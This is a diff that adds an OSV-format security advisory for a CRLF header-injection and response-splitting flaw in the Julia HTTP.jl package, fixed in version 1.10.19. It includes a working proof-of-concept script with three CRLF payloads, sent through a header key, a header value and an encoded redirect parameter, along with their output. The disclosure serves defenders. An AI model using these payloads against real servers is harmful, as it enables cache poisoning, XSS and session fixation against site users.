@@ -1,0 +1,47 @@
+{
+    "schema_version": "1.7.3",
+    "id": "JLSEC-2025-40",
+    "modified": "2025-10-14T04:37:19.606Z",
+    "published": "2025-10-14T04:37:19.606Z",
+    "aliases": [
+        "GHSA-h3x8-ppwj-6vcj",
+        "CVE-2025-61689"
+    ],
+    "summary": "Header injection/Response splitting via header construction.",
+    "details": "HTTP.jl did not validate header names/values for illegal characters, allowing CRLF-based header injection and response splitting.\n\n```\nusing HTTP, Sockets\n\nfunction handle_index(req::HTTP.Request)\n    @show HTTP.header(req, \"X-Foo\")\n    return HTTP.Response(200, \"ok\")\nend\n\nfunction handle_redirect(req::HTTP.Request)\n    return HTTP.Response(301, [\"Location\" => get(HTTP.URIs.queryparams(req), \"to\", \"/\")], \"redirect\")\nend\n\nconst router = HTTP.Router()\nHTTP.register!(router, \"GET\", \"/\", handle_index)\nHTTP.register!(router, \"GET\", \"/redirect\", handle_redirect)\n\nserver = HTTP.serve!(router, Sockets.IPv4(0,0,0,0), 8080)\n\n\nprintln(\"[*] POC 1: Header injection in request through header key\")\nuser_input = \"X-Custom: x\\r\\nX-Foo: Bar\\r\\nX-Custom\"\nHTTP.get(\"http://localhost:8080/\", [user_input => \"hello\"])\n\nprintln()\n\nprintln(\"[*] POC 2: Header injection in request through header value\")\nuser_input = \"hello\\r\\nX-Foo: Bar\"\nHTTP.get(\"http://localhost:8080/\", [\"X-Custom\" => user_input])\n\nprintln()\n\nprintln(\"[*] POC 3: Header injection in response through header value\")\nres = HTTP.get(\"http://localhost:8080/redirect?to=/%0d%0aX-Foo:%20Bar\", redirect=false)\n@show HTTP.header(res, \"X-Foo\")\n\n```\n\n_Result_\n\n```\n[ Info: Listening on: [0.0.0.0:8080](http://0.0.0.0:8080/), thread id: 1\n[*] POC 1: Header injection in request through header key\nHTTP.header(req, \"X-Foo\") = \"Bar\"\n\n[*] POC 2: Header injection in request through header value\nHTTP.header(req, \"X-Foo\") = \"Bar\"\n\n[*] POC 3: Header injection in response through header value\nHTTP.header(res, \"X-Foo\") = \"Bar\"\n```\n\n### Impact\n\nThis enables HTTP response splitting and header injection, leading to cache poisoning, XSS, session fixation, and more.\n\n### Patches\n\nThis issue is fixed in HTTP.jl  `v1.10.19`\n\n### Credit\n\nChen T",
+    "affected": [
+        {
+            "ranges": [
+                {
+                    "type": "SEMVER",
+                    "events": [
+                        {
+                            "introduced": "0"
+                        },
+                        {
+                            "fixed": "1.10.19"
+                        }
+                    ]
+                }
+            ],
+            "package": {
+                "ecosystem": "Julia",
+                "name": "HTTP",
+                "purl": "pkg:julia/HTTP?uuid=cd3eb016-35fb-5094-929b-558a96fad6f3"
+            }
+        }
+    ],
+    "database_specific": {
+        "license": "CC-BY-4.0",
+        "sources": [
+            {
+                "id": "GHSA-h3x8-ppwj-6vcj",
+                "imported": "2025-10-14T02:22:26.408Z",
+                "modified": "2025-10-10T12:51:29Z",
+                "published": "2025-10-10T12:51:29Z",
+                "url": "https://api.github.com/repos/JuliaWeb/HTTP.jl/security-advisories/GHSA-h3x8-ppwj-6vcj",
+                "html_url": "https://github.com/JuliaWeb/HTTP.jl/security/advisories/GHSA-h3x8-ppwj-6vcj"
+            }
+        ]
+    }
+}
